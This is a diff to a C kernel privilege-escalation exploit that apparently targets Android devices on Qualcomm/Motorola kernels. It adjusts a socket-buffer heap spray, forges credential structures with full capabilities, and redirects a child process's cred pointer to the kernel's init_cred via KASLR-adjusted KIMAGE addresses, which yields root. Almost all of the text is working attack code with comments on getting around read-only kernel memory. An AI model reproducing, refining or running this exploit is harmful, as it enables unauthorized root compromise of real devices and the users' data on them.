@@ -8,7 +8,12 @@
 int crash_log_fd = -1;
 
 void crash_log_init(const char *path) {
-  crash_log_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
+  if (fd >= 0) {
+    crash_log_fd = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 96);
+    if (crash_log_fd >= 0) close(fd);
+    else crash_log_fd = fd;
+  }
 }
 
 void crash_log_write(const char *fmt, ...) {
@@ -29,7 +34,20 @@ void crash_log_write(const char *fmt, ...) {
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
-static int reclaim_sv[2] = {-1, -1};
+#define RECLAIM_FDS_MAX 20
+static int reclaim_sv[RECLAIM_FDS_MAX];
+static int reclaim_sv_count = 0;
+
+static void hoist_reclaim_fds(void) {
+  for (int i = 0; i < reclaim_sv_count; i++) {
+    if (reclaim_sv[i] < 0) continue;
+    int high = fcntl(reclaim_sv[i], F_DUPFD, PSELECT_ROUTE_NFDS + 64);
+    if (high >= 0) {
+      close(reclaim_sv[i]);
+      reclaim_sv[i] = high;
+    }
+  }
+}
 static struct mm_ctx prepare_ctx;
 static struct mm_ctx spray_ctx;
 static struct mm_ctx pre_ctx;
@@ -379,13 +397,18 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
   put64(c, 0x38, CAP_FULL);              /* cap_effective */
   put64(c, 0x40, CAP_FULL);              /* cap_bset */
   /* cap_ambient (0x48) = 0 from memset */
-  /* KASLR-adjusted pointers (offsets from active_offsets) */
+  /* 0x78: security blob pointer — set by caller for mode 2 (FAKE_SEBLOB_OFF),
+   * left as 0/NULL for mode 1 (which uses init_cred directly). */
+  /* KASLR-adjusted pointers — use KIMAGE mapping (text_addr), NOT
+   * direct-map (data_addr), because direct-map of .data is read-only
+   * on Qualcomm (CONFIG_RODATA_FULL_DEFAULT_ENABLED) and refcount
+   * operations on user/user_ns/group_info need to write. */
   if (active_offsets && active_offsets->off_root_user)
-    put64(c, 0x80, data_addr(KIMAGE_TEXT_BASE + active_offsets->off_root_user));
+    put64(c, 0x80, text_addr(KIMAGE_TEXT_BASE + active_offsets->off_root_user));
   if (active_offsets && active_offsets->off_init_user_ns)
-    put64(c, 0x88, data_addr(KIMAGE_TEXT_BASE + active_offsets->off_init_user_ns));
+    put64(c, 0x88, text_addr(KIMAGE_TEXT_BASE + active_offsets->off_init_user_ns));
   if (active_offsets && active_offsets->off_init_groups)
-    put64(c, 0x90, data_addr(KIMAGE_TEXT_BASE + active_offsets->off_init_groups));
+    put64(c, 0x90, text_addr(KIMAGE_TEXT_BASE + active_offsets->off_init_groups));
 }
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
@@ -480,12 +503,13 @@ void kill_child(pid_t child) {
 }
 
 void close_reclaim_sockets(void) {
-  for (int i = 0; i < 2; i++) {
+  for (int i = 0; i < reclaim_sv_count; i++) {
     if (reclaim_sv[i] >= 0) {
       close(reclaim_sv[i]);
       reclaim_sv[i] = -1;
     }
   }
+  reclaim_sv_count = 0;
 }
 
 void close_ctx_memfds(struct mm_ctx *ctx) {
@@ -626,9 +650,6 @@ uintptr_t prepare_pagemap_page(int payload_mode) {
     int fl = fcntl(sv[si][0], F_GETFL, 0);
     if (fl >= 0) fcntl(sv[si][0], F_SETFL, fl | O_NONBLOCK);
   }
-  reclaim_sv[0] = sv[0][0];
-  reclaim_sv[1] = sv[0][1];
-
   struct iovec iov = { .iov_base = skb_buf, .iov_len = SKB_SEND_SIZE };
   struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1 };
 
@@ -652,9 +673,12 @@ uintptr_t prepare_pagemap_page(int payload_mode) {
   pr_info("pagemap: spray %d/%d sends, base=0x%zx\n",
           reclaim_ok, SKB_RECLAIM_SENDS * PM_SPRAY_SOCKS, base);
 
-  for (int si = 1; si < PM_SPRAY_SOCKS; si++) {
-    close(sv[si][0]); close(sv[si][1]);
+  reclaim_sv_count = 0;
+  for (int si = 0; si < PM_SPRAY_SOCKS; si++) {
+    reclaim_sv[reclaim_sv_count++] = sv[si][0];
+    reclaim_sv[reclaim_sv_count++] = sv[si][1];
   }
+  hoist_reclaim_fds();
   return base;
 }
 
@@ -681,16 +705,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         } else if (pselect_custom_write == 3) {
           fake_right = pselect_custom_value;
         } else if (pselect_custom_write == 2) {
-          /* Write 2 (cred): point child->cred directly to init_cred.
-           * Use the KIMAGE mapping (text_addr), NOT the direct map
-           * (data_addr): Motorola/Qualcomm kernels mark the direct
-           * map of kernel .data as read-only, so __rb_change_child's
-           * side-write to *(init_cred+8) faults through the linear
-           * map but succeeds through the KIMAGE mapping where .data
-           * is writable. */
+          /* Write 2 (cred): ghost write stores fake_right to child_task->cred.
+           * Point cred to the REAL kernel init_cred (uid=0, full caps, valid
+           * security blob allocated during boot).  Use text_addr (KIMAGE
+           * mapping) because direct-map of .data is read-only on Qualcomm.
+           * Side-write corrupts init_cred.gid/suid but that's harmless —
+           * kernel threads have full caps and bypass DAC. */
           fake_right = text_addr(KIMAGE_TEXT_BASE + active_offsets->off_init_cred);
-          pr_info("W2 init_cred KIMAGE: fake_right=0x%zx off=0x%zx\n",
-                  fake_right, (size_t)active_offsets->off_init_cred);
+          pr_info("W2 cred: fake_right=0x%zx (init_cred via KIMAGE)\n",
+                  fake_right);
         } else {
           /* Write 1 (selinux): rb_erase Case 2 — pi_left = target,
            * pi_pc = fake_right = page addr with low byte 0x00.
@@ -704,13 +727,17 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         fake_right = 0;  /* leaf: write 0 */
       }
       fake_left = 0;
-      if (pselect_custom_write == 2) {
-        fake_fops = payload_base + CRED_COPY_OFF;
-      }
+      /* Mode 2: fake_fops stays at FOPS_TABLE_OFF (cred copy placed there) */
       if (pselect_custom_write == 1 && env_flag("SAFE_W1", 0)) {
         uintptr_t orig = pselect_custom_target;
         pselect_custom_target = payload_base + 0x0100;
         pr_info("SAFE_W1: redirect target 0x%zx -> 0x%zx (spray page)\n",
+                orig, pselect_custom_target);
+      }
+      if (pselect_custom_write == 2 && env_flag("W2_DRY_RUN", 0)) {
+        uintptr_t orig = pselect_custom_target;
+        pselect_custom_target = payload_base + SCRATCH_OFF;
+        pr_info("W2_DRY_RUN: redirect target 0x%zx -> 0x%zx (spray page scratch)\n",
                 orig, pselect_custom_target);
       }
       fake_parent = pselect_custom_target - 8;
@@ -774,7 +801,6 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     task_group = SLIDE_ROOT_TASK_GROUP;
     pi_top_task = SLIDE_INIT_TASK;
   }
-
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
@@ -932,9 +958,19 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, LEFT_OFF + 0x10, 0);
 
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      put_fake_fops_table(p, FOPS_TABLE_OFF);
-      if (pselect_custom_write >= 2) {
-        fill_init_cred_copy(p, CRED_COPY_OFF);
+      if (pselect_custom_write == 2) {
+        /* Mode 2: ghost write stores text_addr(init_cred) to child->cred.
+         * Child gets the REAL kernel init_cred — uid=0, full caps, valid
+         * security blob (allocated by LSM during boot), real user/user_ns/
+         * group_info pointers.  No spray page cred copy or fake seblob
+         * needed.  Side-write corrupts init_cred.gid/suid via KIMAGE
+         * mapping (writable), but kernel threads bypass DAC via caps. */
+        pr_info("W2 mode: init_cred via KIMAGE (no spray page cred)\n");
+      } else {
+        put_fake_fops_table(p, FOPS_TABLE_OFF);
+        if (pselect_custom_write >= 2) {
+          fill_init_cred_copy(p, CRED_COPY_OFF);
+        }
       }
     }
   }
@@ -1122,8 +1158,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     int fl = fcntl(spray_sv[si][0], F_GETFL, 0);
     if (fl >= 0) fcntl(spray_sv[si][0], F_SETFL, fl | O_NONBLOCK);
   }
-  reclaim_sv[0] = spray_sv[0][0];
-  reclaim_sv[1] = spray_sv[0][1];
   int pcp_shaping_sv[2];
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));
 
@@ -1189,10 +1223,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
   pr_info("reclaim: %d/%d sends ok (buf: snd=%d rcv=%d, socks=%d)\n",
           reclaim_ok, SKB_RECLAIM_SENDS * N_SPRAY_SOCKS, sndbuf, rcvbuf, N_SPRAY_SOCKS);
-  for (int si = 1; si < N_SPRAY_SOCKS; si++) {
-    close(spray_sv[si][0]);
-    close(spray_sv[si][1]);
+  reclaim_sv_count = 0;
+  for (int si = 0; si < N_SPRAY_SOCKS; si++) {
+    reclaim_sv[reclaim_sv_count++] = spray_sv[si][0];
+    reclaim_sv[reclaim_sv_count++] = spray_sv[si][1];
   }
+  hoist_reclaim_fds();
   kernelsnitch_cleanup(ks);
   ks = NULL;
 
